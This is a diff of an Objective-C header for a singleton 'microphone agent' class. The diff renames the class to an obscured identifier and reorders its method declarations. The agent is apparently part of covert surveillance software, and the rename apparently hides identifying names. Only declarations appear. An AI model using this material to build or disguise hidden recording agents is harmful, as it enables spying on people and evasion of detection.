@@ -39,7 +39,7 @@ void myInputAudioCallback(void                               *inUserData,
                           UInt32                             inNumPackets,
                           const AudioStreamPacketDescription *inPacketDescs);
 
-@interface RCSMAgentMicrophone : NSObject <Agents>
+@interface __m_MAgentMicrophone : NSObject <Agents>
 {
 @private
   NSMutableDictionary         *mAgentConfiguration;
@@ -74,13 +74,15 @@ void myInputAudioCallback(void                               *inUserData,
 @property (readonly)          NSLock *mLockGeneric;
 @property (readwrite, assign) NSMutableData *mAudioBuffer;
 
-+ (RCSMAgentMicrophone *)sharedInstance;
++ (__m_MAgentMicrophone *)sharedInstance;
+
 + (id)allocWithZone: (NSZone *)aZone;
-- (id)copyWithZone: (NSZone *)aZone;
-- (id)retain;
+
 - (unsigned)retainCount;
-- (void)release;
+- (id)retain;
 - (id)autorelease;
+- (void)release;
+- (id)copyWithZone: (NSZone *)aZone;
 - (id)init;
 
 - (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
